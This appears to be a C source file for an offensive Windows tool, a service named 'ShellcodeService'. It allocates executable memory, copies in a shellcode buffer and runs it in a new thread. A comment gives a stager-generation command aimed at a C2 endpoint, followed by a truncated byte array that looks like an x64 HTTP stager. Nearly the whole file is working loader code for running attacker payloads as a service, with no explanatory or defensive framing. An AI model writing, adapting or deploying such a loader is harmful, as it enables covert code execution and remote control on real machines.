/* x86_64-w64-mingw32-gcc ShellcodeService.c -o ShellcodeService.exe -municode */
#include <windows.h>

SERVICE_STATUS gSvcStatus = {
	.dwServiceType = SERVICE_WIN32_OWN_PROCESS,
	.dwCurrentState = 0,
	.dwControlsAccepted = 0,
	.dwWin32ExitCode = 0,
	.dwServiceSpecificExitCode = 0,
	.dwCheckPoint = 0,
	.dwWaitHint = 0
};

SERVICE_STATUS_HANDLE gSvcStatusHandle;

/* generate stager -L <c2 endpoint> -l <port> -f c -r http
 * unsigned char buf[] =
 *   "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
 *	  "\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
 *	  "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f"
 *	  "\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
 *	  "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
 *	  ...
 *	  "\xd5\x48\x83\xc4\x20\x85\xc0\x0f\x84\x84\xff\xff\xff\x58"
 *	  "\xc3\x58\x6a\x00\x59\xbb\xe0\x1d\x2a\x0a\x41\x89\xda\xff"
 *	  "\xd5"; */

void Handler(DWORD dwControl) {
	switch (dwControl) {
	case SERVICE_CONTROL_STOP:
		gSvcStatus.dwCurrentState = SERVICE_STOPPED;
		gSvcStatus.dwControlsAccepted = 0;
		gSvcStatus.dwCheckPoint = 0;
		SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
		break;
	case SERVICE_CONTROL_SHUTDOWN:
		gSvcStatus.dwCurrentState = SERVICE_STOPPED;
		gSvcStatus.dwControlsAccepted = 0;
		gSvcStatus.dwCheckPoint = 0;
		SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
		break;
	}
}

void ServiceMain(DWORD dwNumServicesArgs, LPSTR* lpServiceArgVectors) {
	/* Register a handler function to handle control requests for the service */
	gSvcStatusHandle = RegisterServiceCtrlHandlerW(L"ShellcodeService", (LPHANDLER_FUNCTION)Handler);

	/* Indicate SCM that service is starting */
	gSvcStatus.dwCurrentState = SERVICE_START_PENDING;

	/* If service fails to start, stop the service */
	if (SetServiceStatus(gSvcStatusHandle, &gSvcStatus) == 0) {
		gSvcStatus.dwCurrentState = SERVICE_STOPPED;
		SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
	}

	/* Start running service */
	gSvcStatus.dwCurrentState = SERVICE_RUNNING;
	gSvcStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	gSvcStatus.dwCheckPoint = 1;
	SetServiceStatus(gSvcStatusHandle, &gSvcStatus);

	/* Allocate memory within the address space of the calling process */
	LPVOID memAddr = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (memAddr == NULL) {
		gSvcStatus.dwCurrentState = SERVICE_STOPPED;
		gSvcStatus.dwControlsAccepted = 0;
		gSvcStatus.dwCheckPoint = 0;
		SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
		return;
	}

	/* Copy the contents of buf to newly allocated memory block by VirtualAlloc */
	RtlMoveMemory(memAddr, buf, sizeof(buf));

	/* Create a thread within the virtual address space of the calling process */
	HANDLE hHandle = CreateThread(NULL, 0, memAddr, NULL, 0, NULL);
	if (hHandle == NULL) {
		gSvcStatus.dwCurrentState = SERVICE_STOPPED;
		gSvcStatus.dwControlsAccepted = 0;
		gSvcStatus.dwCheckPoint = 0;
		SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
		return;
	}
	WaitForSingleObject(hHandle, INFINITE);

	/* Stop the service */
	gSvcStatus.dwCurrentState = SERVICE_STOPPED;
	gSvcStatus.dwControlsAccepted = 0;
	gSvcStatus.dwCheckPoint = 0;
	SetServiceStatus(gSvcStatusHandle, &gSvcStatus);
}

int wmain() {
	/* Initialize members of SERVICE_TABLE_ENTRYW for StartServiceCtrlDispatcherW */
	SERVICE_TABLE_ENTRYW lpServiceStartTable[] = {
		{L"ShellcodeService", (LPSERVICE_MAIN_FUNCTIONW)ServiceMain},
		{NULL, NULL}
	};

	/* Connect the main thread of the service process to SCM */
	StartServiceCtrlDispatcherW(lpServiceStartTable);
	return 0;
}
